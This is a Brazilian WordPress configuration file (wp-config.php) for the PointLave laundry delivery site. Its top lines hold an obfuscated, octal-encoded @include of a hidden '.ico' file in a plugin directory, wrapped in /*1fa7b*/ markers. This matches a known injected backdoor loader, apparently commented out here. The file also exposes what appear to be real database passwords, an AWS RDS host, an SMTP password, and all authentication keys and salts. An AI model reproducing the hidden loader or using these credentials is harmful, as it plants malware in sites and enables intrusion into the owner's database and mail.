<?php
/*1fa7b*/

// @include "\057v\141r\057w\167w\057h\164m\154/\167p\055c\157n\164e\156t\057p\154u\147i\156s\057e\171e\163-\157n\154y\055u\163e\162-\141c\143e\163s\055s\150o\162t\143o\144e\057.\0631\060d\144a\0605\056i\143o";

/*1fa7b*/

/**
 * As configurações básicas do WordPress
 *
 * O script de criação wp-config.php usa esse arquivo durante a instalação.
 * Você não precisa user o site, você pode copiar este arquivo
 * para "wp-config.php" e preencher os valores.
 *
 * Este arquivo contém as seguintes configurações:
 *
 * * Configurações do MySQL
 * * Chaves secretas
 * * Prefixo do banco de dados
 * * ABSPATH
 *
 * @link https://codex.wordpress.org/pt-br:Editando_wp-config.php
 *
 * @package WordPress
 */

// ** Configurações do MySQL - Você pode pegar estas informações
// com o serviço de hospedagem ** //
/** O nome do banco de dados do WordPress */
//define( 'DB_NAME', 'pointlave_db' );
define( 'DB_NAME', 'db_mysql' );

/** Usuário do banco de dados MySQL */
define( 'DB_USER', 'root' );

/** Senha do banco de dados MySQL */
//define( 'DB_PASSWORD', 'jA$6(vwgSgtm' );
define( 'DB_PASSWORD', 'ZB67uctY5rXo' );

/** Nome do host do MySQL */
//define( 'DB_HOST', 'pointlave.cxqoctmnmtli.us-east-2.rds.amazonaws.com' );
define( 'DB_HOST', 'mysql' );

/** Charset do banco de dados a ser usado na criação das tabelas. */
define('DB_CHARSET', 'utf8');

/** O tipo de Collate do banco de dados. Não altere isso se tiver dúvidas. */
define('DB_COLLATE', 'utf8_general_ci');

/**#@+
 * Chaves únicas de autenticação e salts.
 *
 * Altere cada chave para um frase única!
 * Você pode gerá-las
 * usando o {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org
 * secret-key service}
 * Você pode alterá-las a qualquer momento para desvalidar quaisquer
 * cookies existentes. Isto irá forçar todos os
 * usuários a fazerem login novamente.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '/D&qA`f d{3XCp$GW)h<K-rkQL-bY%~0m^vZBTFY,<:=1>P1Ex!]xx+LBRlNnr98');
define('SECURE_AUTH_KEY',  'PG}-4j4u~s5/^v:yH{#_~#ApSDADsxic@wKw<EuQYr$cq#pkKu1(l@q[UEUd:;Nt');
define('LOGGED_IN_KEY',    '!$sv+CD.i9{A|n1tJhAq)~?w~yzza/CLVMn]ZRvZKaskhp1|>QNPT)$=-oIEmv(t');
define('NONCE_KEY',        '{E!FLHo;v9/<~#i$E9NeYnoLHbmXH1I*u,%}2<*mRWs3v@iS(vs,7c%wZ4}5z9w$');
define('AUTH_SALT',        'AjTGx2Dl#(V3&VNXvy.-EPs3@e_rS_qmf8J^psoH.D%,Ib9t/^-focsD4.7{J`w2');
define('SECURE_AUTH_SALT', 'KL^n+yQonOt?MTTXqauJhD:h4{0k[aOkFij)k+QK9.ZY$wXTxQJue`P!<m&6q%@Z');
define('LOGGED_IN_SALT',   'F,~:5eyE%a[.,zWWJkOx1#5z>`fg&ug32P&!6O}0G[/.>Cz&y.!cm%Wi-+,accKQ');
define('NONCE_SALT',       'z^3gGKAsIG^70-=WcNqxA46VJC}O/_H3Q@E##]S~v^%Z;+Q~iy<_#s/hK4W7T[-0');

/**#@-*/

/**
 * Prefixo da tabela do banco de dados do WordPress.
 *
 * Você pode ter várias instalações em um único banco de dados se você der
 * para cada um um único prefixo. Somente números, letras e sublinhados!
 */
$table_prefix = 'box_';


/* -------------------------------------------------------------------------------------------------------- */

define('WP_ALLOW_MULTISITE', true);

define('MULTISITE', true);
define('SUBDOMAIN_INSTALL', false);
define('DOMAIN_CURRENT_SITE', 'pointlave.com.br');
define('PATH_CURRENT_SITE', '/');
define('SITE_ID_CURRENT_SITE', 1);
define('BLOG_ID_CURRENT_SITE', 1);

define( 'PB_BACKUPBUDDY_MULTISITE_EXPERIMENT', true );

/* -------------------------------------------------------------------------------------------------------- */

@ini_set( 'log_errors', 'Off' );
ini_set('display_errors', 0);
//error_reporting(E_ALL & ~E_NOTICE);
define( 'WP_DEBUG', false );
define( 'WP_DEBUG_LOG', true );
define( 'WP_DEBUG_DISPLAY', false );

define( 'WPLANG', 'pt_BR');

define( 'WP_MEMORY_LIMIT', '512M' );
define( 'WP_MAX_MEMORY_LIMIT', '1024M' );

//Para habilitar o cache
define('WP_CACHE', true); // Added by WP Rocket
define('ENABLE_CACHE', true);

define( 'SMTP_USER',   'trial' );    // Username to use for SMTP authentication
define( 'SMTP_PASS',   'hACpwHiT0931' );       // Password to use for SMTP authentication
define( 'SMTP_HOST',   'smtplw.com.br' );    // The hostname of the mail server
define( 'SMTP_FROM',   'contato@pointlave.com.br' ); // SMTP From email address
define( 'SMTP_NAME',   'PointLave - Lavanderia Delivery' );    // SMTP From name
define( 'SMTP_PORT',   587 );                  // SMTP port number - likely to be 25, 465 or 587
define( 'SMTP_SECURE', 'tls' );                 // Encryption system to use - ssl or tls
define( 'SMTP_AUTH',    true );                 // Use SMTP authentication (true|false)
define( 'SMTP_DEBUG',   0 );                    // for debugging purposes only set to 1 or 2

//Para desabilitar o cache
//define('WP_CACHE', false);
//define('DISABLE_CACHE', true);
// Para definir uma expiração para o cache, em segundos
//define('CACHE_EXPIRATION_TIME', 3600);

//define( 'EMPTY_TRASH_DAYS', 0 ); // Zero days

//define( 'COOKIE_DOMAIN', 'www.fastlave.com.br' );

define( 'WP_HOME', 'https://www.pointlave.com' );
define( 'WP_SITEURL', 'https://www.pointlave.com' );
define('FORCE_SSL_ADMIN', true);
define('FORCE_SSL_LOGIN', true);

// PERMISSAO PASTAS
define('FS_METHOD', 'direct');

//define( 'DISABLE_WP_CRON', 'true');
//define( 'WP_CLI' );

define( 'DISALLOW_FILE_EDIT', true ); // ok
//define( 'DISALLOW_FILE_MODS', true);

define( 'AUTOMATIC_UPDATER_DISABLED', true ); // ok
define( 'WP_AUTO_UPDATE_CORE', false ); // ok
//define( 'WP_HTTP_BLOCK_EXTERNAL', true );

/* -------------------------------------------------------------------------------------------------------- */


/** Caminho absoluto para o diretório WordPress. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Configura as variáveis e arquivos do WordPress. */
require_once(ABSPATH . 'wp-settings.php');
